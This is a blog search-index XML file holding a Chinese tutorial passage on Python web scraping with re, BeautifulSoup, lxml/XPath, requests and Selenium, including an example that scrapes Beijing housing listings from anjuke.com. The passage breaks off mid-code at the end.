<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python爬虫</title>
      <link href="/cs/%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86/"/>
      <url>/cs/%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>基础知识及案例。<br><a id="more"></a>  </p><h1 id="1-库的说明"><a href="#1-库的说明" class="headerlink" title="1. 库的说明"></a>1. 库的说明</h1><h2 id="1-1-re"><a href="#1-1-re" class="headerlink" title="1.1. re"></a>1.1. re</h2><p>Python正则表达式文档：<a href="https://docs.python.org/3/library/re.html" target="_blank" rel="noopener">https://docs.python.org/3/library/re.html</a><br>Python正则表达式的3种方法，分别是match、search和findall。</p><p>re.match方法</p><p>re.match：从字符串起始位置匹配，有则返回re.Match object，没有则返回none。</p><p>re.match(pattern, string, flags=0)<br>pattern：正则表达式，包含一些特殊的字符<br>string：被匹配的原字符串<br>flags：控制正则表达式的匹配方式，如是否区分大小写、多行匹配等。<br>例如，我们想使用两个字符串匹配并找到匹配的位置，可以使用<br>import re<br>m = re.match(‘www’, ‘<a href="http://www.santostang.com&#39;" target="_blank" rel="noopener">www.santostang.com&#39;</a>)<br>print (“匹配的结果：  “, m)<br>print (“匹配的起始与终点：  “, m.span())<br>print (“匹配的起始位置：  “, m.start())<br>print (“匹配的终点位置：  “, m.end())</p><p><a href="https://docs.python.org/3/library/re.html#match-objects" target="_blank" rel="noopener">https://docs.python.org/3/library/re.html#match-objects</a> </p><p>得到的结果为：<br>匹配的结果： &lt;re.Match object; span=(0, 3), match=’www’&gt;<br>匹配的起始与终点： (0, 3)<br>匹配的起始位置： 0<br>匹配的终点位置： 3</p><p>匹配具有一定模式的字符串，例如：<br>line = “Fat cats are smarter than dogs, is it right? “<br>m = re.match( r’(.＊) are (.＊? ) dogs’, line)<br>print (‘匹配的整句话’, m.group(0))<br>print (‘匹配的第一个结果’, m.group(1))<br>print (‘匹配的第二个结果’, m.group(2))<br>print (‘匹配的结果列表’, m.groups())<br>得到的结果为：<br>匹配的整句话Fat cats are smarter than dogs<br>匹配的第一个结果Fat cats<br>匹配的第二个结果smarter than<br>匹配的结果列表 (‘Fat cats’, ‘smarter than’)</p><p>为什么要在match的模式前加上r呢？<br>r：raw string，纯粹的字符串。</p><p>使用它就不会对引号里面的反斜杠’\’进行特殊处理。因为在正则表达式中有一些类似’\d’（匹配任何数字）的模式，所以模式中的单个反斜杠’\’符号都要进行转译。<br>假如你需要匹配文本中的字符”\”，使用编程语言表示的正则表达式里就需要4个反斜杠”\\“：前两个反斜杠”\“和后两个反斜杠”\“各自在编程语言里转义成一个反斜杠”/“，所以4个反斜杠”\\“就转义成了两个反斜”\“，这两个反斜杠”\“最终在正则表达式里转义成一个反斜杠”\”。<br>Python里的原生字符串很好地解决了这个问题，在正则表达式里不会再转义，这个例子中的正则表达式可以使用r”\“表示。</p><p>(.<em>) are会尽量匹配最多的字符。贪婪模式<br>(.</em>? )会尽量匹配尽量少的字符。非贪婪模式</p><p>re.search方法<br>re.match只能从字符串的【起始】位置进行匹配<br>re.search扫描整个字符串并返回【第一个】成功的匹配，例如：<br>import re<br>m_match = re.match(‘com’, ‘<a href="http://www.santostang.com&#39;" target="_blank" rel="noopener">www.santostang.com&#39;</a>)<br>m_search = re.search(‘com’, ‘<a href="http://www.santostang.com&#39;" target="_blank" rel="noopener">www.santostang.com&#39;</a>)<br>print (m_match)<br>print (m_search)<br>得到结果为：<br>None</p><p>&lt;re.Match object; span=(15, 18), match=’com’&gt;<br>其他方面re.search与re.match一样，可以参照上面的re.match来操作。</p><p>re.findall方法<br>match和search，只能找到一个匹配所写的模式<br>findall可以找到所有的匹配，返回列表</p><p>import re<br>m_match = re.match(‘[0-9]+’, ‘12345 is the first number, 23456 is the sencond’)<br>m_search = re.search(‘[0-9]+’, ‘The first number is 12345, 23456 is the sencond’)<br>m_findall = re.findall(‘[0-9]+’, ‘12345 is the first number, 23456 is the sencond’)<br>print (m_match.group())<br>print (m_search.group())<br>print (m_findall)</p><p>上述代码的’[0-9]+’表示任意长度的数字，然后在后面的字符串中进行匹配。</p><h2 id="1-2-bs4"><a href="#1-2-bs4" class="headerlink" title="1.2. bs4"></a>1.2. bs4</h2><p>使用BeautifulSoup解析网页<br>BeautifulSoup是一个工具箱。通过【解析文档】来提取数据。<br>BeautifulSoup可以从HTML或XML文件中提取数据。<br>Beautiful Soup可以提供一些简单的、Python式的函数用来处理导航、搜索、修改分析树等。<br>简单，不需要多少代码就可以写出一个完整的应用程序。<br>非常强大</p><p>Beautiful Soup支持Python标准库中的HTML解析器，还支持一些第三方的解析器。</p><p>BeautifulSoup 4<br>主要特性<br>适合做什么<br>怎样使用</p><p>主要的解析器及其优缺点<br><a href="https://res.weread.qq.com/wrepub/epub_928559_44" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_44</a><br><a href="https://res.weread.qq.com/wrepub/epub_928559_49" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_49</a><br>使用lxml的解析器将会解析得更快。</p><p>使用BeautifulSoup获取博客标题<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">link = <span class="string">"http://www.santostang.com/"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'</span>&#125; </span><br><span class="line">r = requests.get(link, headers= headers)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">"html.parser"</span>) <span class="comment"># 将网页响应体的字符串转化为soup对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;h1&gt;元素，class为' post-title'，提取&lt;a&gt;元素中的文字，strip()的功能是把字符串左右的空格去掉。find只是用来找到第一条结果。</span></span><br><span class="line">first_title = soup.find(<span class="string">"h1"</span>, class_=<span class="string">"post-title"</span>).a.text.strip() </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"第一篇文章的标题是："</span>, first_title)</span><br><span class="line"></span><br><span class="line">title_list = soup.find_all(<span class="string">"h1"</span>, class_=<span class="string">"post-title"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(title_list)):</span><br><span class="line">    title = title_list[i].a.text.strip()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'第 %s 篇文章的标题是：%s'</span> %(i+<span class="number">1</span>, title))</span><br></pre></td></tr></table></figure></p><p>找所有结果，用find_all。find_all返回列表。</p><p>BeautifulSoup的其他功能<br>为了演示BeautifulSoup的功能，这里截取博客主页的一段代码：</p><p>soup.prettify()  代码美化<br>首先，需要把代码转化成BeautifulSoup对象：<br>soup = BeautifulSoup(html, “html.parser”)</p><p>BeautifulSoup对象是一个复杂的【树】形结构，它的每一个【节点】都是一个【Python对象】。<br>提取对象的3种方法：<br>（1）遍历文档树<br>（2）搜索文档树<br>（3）CSS选择器<br>1．遍历文档树<br>先爬树干，然后小树干，最后树枝。<br>soup.header.h3：获取取</p><h3>标签。如结果为：<h3 id="name">大数据@唐松Santos</h3>）。<p></p><p>soup.header.div.contents：列出某个标签的所有子节点。只能获取第一代子标签。<br>soup.header.div.contents[1]：索引为1的子标签。<br>soup.header.div.children：获得所有子标签。只能获取第一代子标签。<br>soup.header.div.descendants：获得所有子子孙孙标签<br>soup.header.div.a.parent：获得父节点的内容：</p><p>遍历文档树的方法其实使用得比较少</p><p>2．搜索文档树<br>最常用的是搜索文档树。<br>最常用的是find()和find_all()。<br>find()和find_all()方法还可以和re正则结合起来使用</p><p>for tag in soup.find_all(re.compile(“^h”)):  # 找出所有以h开头的标签，这表示<header>和<h3>的标签都会被找到<br>    print(tag.name)<br>输出的结果是：<br>header<br>h3</h3></header></p><p>上面的例子能够。如果传入正则表达式作为参数，Beautiful Soup就会通过正则表达式的match()来匹配内容。</p><ol><li>CSS选择器</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">通过tag标签逐层查找：soup.select("header h3")⇒得到的结果是：[<span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">"name"</span>&gt;</span>大数据@唐松Santos<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>]</span><br><span class="line">通过某个tag标签下的直接子标签遍历，：</span><br><span class="line">soup.select("header &gt; h3") ⇒[<span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">"name"</span>&gt;</span>大数据@唐松Santos<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>]</span><br><span class="line">soup.select("div &gt; a") ⇒ <span class="tag">&lt;<span class="name">div</span>&gt;</span>下所有的<span class="tag">&lt; <span class="attr">a</span>&gt;</span>标签</span><br><span class="line">[<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/feed/"</span> <span class="attr">rel</span>=<span class="string">"nofollow"</span> <span class="attr">target</span>=<span class="string">"_blank"</span><span class="attr">title</span>=<span class="string">"RSS"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>　<span class="attr">aria-hidden</span>=<span class="string">"true"</span>　<span class="attr">class</span>=<span class="string">"fa　fa-rss"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,　<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://weibo.com/santostang"</span> <span class="attr">rel</span>=<span class="string">"nofollow"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">title</span>=<span class="string">"Weibo"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">class</span>=<span class="string">"fa fa-weibo"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>, …]</span><br><span class="line"></span><br><span class="line">soup.select('a[href^="http://www.santostang.com/"]')：找所有链接以http://www.santostang.com/开始的<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签</span><br><span class="line">得到的结果是：</span><br><span class="line">[<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/feed/"</span> <span class="attr">rel</span>=<span class="string">"nofollow"</span> <span class="attr">target</span>=<span class="string">"_blank"</span><span class="attr">title</span>=<span class="string">"RSS"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">class</span>=<span class="string">"fa fa-rss"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/about-me/"</span>&gt;</span>关于我<span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/post-search/"</span>&gt;</span>文章搜索<span class="tag">&lt;/<span class="name">a</span>&gt;</span>,</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.santostang.com/wp-login.php"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]</span><br></pre></td></tr></table></figure><p>5.3 使用lxml解析网页<br>一些比较流行的解析库<br>Xpath语法（如lxml），同样是效率比较高的解析方法。lxml使用C语言编写，解析速度比不使用lxml解析器的BeautifulSoup快一些。</p><p>5.3.2 使用lxml获取博客标题<br>使用lxml提取网页源代码数据的3种方法<br>    XPath选择器<br>    CSS选择器<br>    BeautifulSoup的find()方法</p><p>和BeautifulSoup相比，lxml还多了一种XPath选择器方法。</p><p>XPath是一门在XML文档中查找信息的语言。<br>XPath使用路径表达式来选取XML文档中的节点或节点集，也可以用在HTML获取数据中。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">link = <span class="string">"http://www.santostang.com/"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'</span>&#125; </span><br><span class="line">r = requests.get(link, headers= headers)</span><br><span class="line"></span><br><span class="line">html = etree.HTML(r.text) <span class="comment"># 解析为lxml的格式</span></span><br><span class="line">title_list = html.xpath(<span class="string">'//h1[@class="post-title"]/a/text()'</span>) <span class="comment"># 用XPath读取里面的内容</span></span><br><span class="line"><span class="keyword">print</span> (title_list)</span><br><span class="line"></span><br><span class="line">//：无论在文档中什么位置</span><br><span class="line">//h1：所有&lt;h1&gt;元素</span><br><span class="line">//h1[@class="post-title"]：&lt;h1&gt;中class为"post-title"的元素</span><br><span class="line">/a表示选取&lt;h1&gt;子元素的&lt;a&gt;元素</span><br><span class="line">/text()表示提取&lt;a&gt;元素中的所有文本。</span><br></pre></td></tr></table></figure></p><p>chrome审查，右键，选取元素，Copy→Copy XPath</p><p>5.3.3 XPath的选取方法<br>XPath使用路径表达式可以在网页源代码中选取节点，它是沿着路径来选取的，如表5-3所示。<br>XPath路径表达式及其描述 <a href="https://res.weread.qq.com/wrepub/epub_928559_47" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_47</a><br>下面是一个XML文档，我们将用XPath提取其中的一些数据。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;? &gt;</span><br><span class="line">&lt;bookstore&gt;</span><br><span class="line">    &lt;book&gt;  </span><br><span class="line">        &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;  </span><br><span class="line">        &lt;author&gt;J K. Rowling&lt;/author&gt;  </span><br><span class="line">        &lt;year&gt;2005&lt;/year&gt;  </span><br><span class="line">        &lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure></p><p>XPath的一些路径表达式及其结果：<a href="https://res.weread.qq.com/wrepub/epub_928559_48" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_48</a></p><p><a href="https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%80%E7%89%88/Cha%205%20-%E8%A7%A3%E6%9E%90%E7%BD%91%E9%A1%B5/Cha%205%20-%E8%A7%A3%E6%9E%90%E7%BD%91%E9%A1%B5.ipynb" target="_blank" rel="noopener">https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%80%E7%89%88/Cha%205%20-%E8%A7%A3%E6%9E%90%E7%BD%91%E9%A1%B5/Cha%205%20-%E8%A7%A3%E6%9E%90%E7%BD%91%E9%A1%B5.ipynb</a></p><p>5.5 BeautifulSoup爬虫实践：房屋价格数据<br>目的：获取安居客网站上北京二手房的数据。获取前10页二手房源的名称、价格、几房几厅、大小、建造年份、联系人、地址、标签。<br>网址：<a href="https://beijing.anjuke.com/sale/。" target="_blank" rel="noopener">https://beijing.anjuke.com/sale/。</a><br>5.5.1 网站分析</p><p>5.5.2 项目实践<br>通过以上分析已经能够获得各个数据所在的地址，接下来用requests加上BeautifulSoup获取安居客北京二手房结果的第一页数据，代码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    link = <span class="string">'https://beijing.anjuke.com/sale/p'</span> + str(i)</span><br><span class="line">    r = requests.get(link, headers = headers)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'现在爬取的是第'</span>, i, <span class="string">'页'</span>)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">'lxml'</span>)</span><br><span class="line">    house_list = soup.find_all(<span class="string">'li'</span>, class_=<span class="string">"list-item"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> house <span class="keyword">in</span> house_list:</span><br><span class="line">        name = house.find(<span class="string">'div'</span>, class_ =<span class="string">'house-title'</span>).a.text.strip()</span><br><span class="line">        price = house.find(<span class="string">'span'</span>, class_=<span class="string">'price-det'</span>).text.strip()</span><br><span class="line">        price_area = house.find(<span class="string">'span'</span>, class_=<span class="string">'unit-price'</span>).text.strip()</span><br><span class="line"></span><br><span class="line">        no_room = house.find(<span class="string">'div'</span>, class_=<span class="string">'details-item'</span>).span.text</span><br><span class="line">        area = house.find(<span class="string">'div'</span>, class_=<span class="string">'details-item'</span>).contents[<span class="number">3</span>].text</span><br><span class="line">        floor = house.find(<span class="string">'div'</span>, class_=<span class="string">'details-item'</span>).contents[<span class="number">5</span>].text</span><br><span class="line">        year = house.find(<span class="string">'div'</span>, class_=<span class="string">'details-item'</span>).contents[<span class="number">7</span>].text</span><br><span class="line">        broker = house.find(<span class="string">'span'</span>, class_=<span class="string">'brokername'</span>).text</span><br><span class="line">        broker = broker[<span class="number">1</span>:]</span><br><span class="line">        address = house.find(<span class="string">'span'</span>, class_=<span class="string">'comm-address'</span>).text.strip()</span><br><span class="line">        address = address.replace(<span class="string">'\xa0\xa0\n                    '</span>,<span class="string">'  '</span>)</span><br><span class="line">        tag_list = house.find_all(<span class="string">'span'</span>, class_=<span class="string">'item-tags'</span>)</span><br><span class="line">        tags = [i.text <span class="keyword">for</span> i <span class="keyword">in</span> tag_list] </span><br><span class="line">        <span class="keyword">print</span> (name, price, price_area, no_room, area, floor, year, broker, address, tags)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">```  </span><br><span class="line">进阶：获取其中的各项数据，如小区名称、房屋类型、房屋朝向、参考首付等。</span><br><span class="line"></span><br><span class="line">https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%<span class="number">80</span>%E7%<span class="number">89</span>%<span class="number">88</span>/Cha%<span class="number">205</span>%<span class="number">20</span>-%E8%A7%A3%E6%<span class="number">9</span>E%<span class="number">90</span>%E7%BD%<span class="number">91</span>%E9%A1%B5/Cha%<span class="number">205</span>%<span class="number">20</span>_%E7%AB%A0%E6%<span class="number">9</span>C%AB%E5%AE%<span class="number">9</span>E%E6%<span class="number">88</span>%<span class="number">98.</span>ipynb</span><br><span class="line"><span class="comment">### 1.2.1. requests  </span></span><br><span class="line">```py  </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">'http://www.santostang.com/'</span>)  </span><br><span class="line"><span class="comment"># ========【r的方法】========  </span></span><br><span class="line"><span class="comment"># r response响应对象，存储了服务器响应的内容，以从中获取需要的信息  </span></span><br><span class="line"><span class="comment"># r.encoding  服务器内容使用的文本编码。  </span></span><br><span class="line"><span class="comment"># r.status_code 响应状态码。检测请求是否正确响应。  </span></span><br><span class="line"><span class="comment"># r.text  字符串方式的响应体。会自动根据响应头部的字符编码进行解码。  </span></span><br><span class="line"><span class="comment"># r.content 字节方式的响应体。会自动解码gzip和deflate编码的响应数据。gzip文件用这个。  </span></span><br><span class="line"><span class="comment"># r.json()  Requests中内置的JSON解码器。  </span></span><br><span class="line"><span class="comment"># r.url r对应的请求的页面网址  </span></span><br><span class="line"><span class="comment"># ========【requests.get的参数设置】========  </span></span><br><span class="line"><span class="comment">## URL参数、请求头、发送POST请求、设置超时  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ----------【params】：dict ----------  </span></span><br><span class="line"><span class="comment">### get传递url参数。http://httpbin.org/get?key1=value1&amp;key2=value2  </span></span><br><span class="line">key_dict = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;  </span><br><span class="line">r = requests.get(<span class="string">'http://httpbin.org/get'</span>, params=key_dict)  </span><br><span class="line"><span class="comment">## ----------【headers】：dict ----------  </span></span><br><span class="line"><span class="comment">### 有的网站不带请求头会返回错误的数据。带请求头使程序更像人的手动行为  </span></span><br><span class="line">headers = &#123;  </span><br><span class="line"><span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36'</span>,  </span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'www.santostang.com'</span>  </span><br><span class="line">&#125;  </span><br><span class="line">r = requests.get(<span class="string">'http://www.santostang.com/'</span>, headers=headers)  </span><br><span class="line"><span class="comment">## ----------【data】: dict ----------  </span></span><br><span class="line"><span class="comment">### 用于提交表单。data在发出请求的时候会自动编码为表单形式。  </span></span><br><span class="line">key_dict = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;  </span><br><span class="line">r = requests.post(<span class="string">'http://httpbin.org/post'</span>, data=key_dict)  </span><br><span class="line"><span class="comment">## ----------【timeout】: 单位为秒 ----------  </span></span><br><span class="line"><span class="comment">### 如果服务器在timeout秒内没有应答，就返回异常。一般会把这个值设置为20秒。  </span></span><br><span class="line">link = <span class="string">"http://www.santostang.com/"</span>  </span><br><span class="line">r = requests.get(link, timeout= <span class="number">0.001</span>)  </span><br><span class="line"><span class="comment">## 返回的异常为：  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ConnectTimeout: HTTPConnectionPool(host='www.santostang.com', port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;requests.packages.urllib3.connection.HTTPConnection object at 0x00000000077806D8&gt;, 'Connection to www.santostang.com timed out. (connect timeout=0.001)'))  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 异常值的意思是，时间限制在0.001秒内，连接到地址为www.santostang.com的时间已到。  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/Santostang/PythonScraping/blob/master/第一版/Cha 3 -静态网页抓取/Cha 3 -静态网页抓取.ipynb  </span></span><br><span class="line">```  </span><br><span class="line"><span class="comment">### 1.2.2. Selenium  </span></span><br><span class="line">Selenium选择元素的方法有很多。  </span><br><span class="line">xpath和css_selector是比较好的方法，一方面比较清晰，另一方面相对其他方法定位元素比较准确。  </span><br><span class="line">```xpath</span><br><span class="line">查找单个元素：  </span><br><span class="line">find_element_by_class_name：<span class="class"><span class="keyword">class</span>选择  </span></span><br><span class="line">    如&lt;p class="content"&gt;Site content goes here.&lt;/p&gt;⇒driver.find_element_by_class_name('content')。  </span><br><span class="line">find_element_by_css_selector：<span class="class"><span class="keyword">class</span>选择  </span></span><br><span class="line">    如&lt;div class='bdy-inner'&gt;test&lt;/div&gt;⇒driver.find_element_by_css_selector ('div.bdy-inner')。  </span><br><span class="line">find_element_by_id：id选择  </span><br><span class="line">    如&lt;div id='bdy-inner'&gt;test&lt;/div&gt;⇒driver.find_element_by_id('bdy-inner')。  </span><br><span class="line">find_element_by_link_text：链接地址选择  </span><br><span class="line">    如&lt;a href="continue.html"&gt;Continue&lt;/a&gt;⇒driver.find_element_by_link_text('Continue')。  </span><br><span class="line">find_element_by_name：name选择  </span><br><span class="line">    如&lt;input name=<span class="string">"username"</span>type=<span class="string">"text"</span> /&gt;⇒driver.find_element_by_name(<span class="string">'username'</span>)。  </span><br><span class="line">find_element_by_partial_link_text：链接的部分地址选择  </span><br><span class="line">    如 &lt;a href="continue.html"&gt;Continue&lt;/a&gt;⇒driver.find_element_by_partial_link_text('Conti')。  </span><br><span class="line">find_element_by_tag_name：名称选择  </span><br><span class="line">    如&lt;h1&gt;Welcome&lt;/h1&gt;⇒driver.find_element_by_tag_name('h1')。  </span><br><span class="line">find_element_by_xpath：通过xpath选择  </span><br><span class="line">    如&lt;form id=<span class="string">"loginForm"</span>&gt; ⇒driver.find_element_by_xpath(<span class="string">"//form[@id='loginForm']"</span>)。  </span><br><span class="line"></span><br><span class="line">查找多个元素时，[element]后加上s：  </span><br><span class="line">find_elements_by_class_name  </span><br><span class="line">find_elements_by_css_selector  </span><br><span class="line">find_elements_by_link_text  </span><br><span class="line">find_elements_by_name  </span><br><span class="line">find_elements_by_partial_link_text  </span><br><span class="line">find_elements_by_tag_name  </span><br><span class="line">find_elements_by_xpath  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">除了Selenium的click操作元素方法，常见的操作元素方法：  </span><br><span class="line">● Clear清除元素的内容。  </span><br><span class="line">● send_keys模拟按键输入。  </span><br><span class="line">● Click单击元素。  </span><br><span class="line">● Submit提交表单。</span><br></pre></td></tr></table></figure></p><p>comment = driver.find_element_by_css_selector(‘div.bdy-inner’)<br>content = comment.find_element_by_tag_name(‘p’) </p><p>Selenium的高级操作：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp 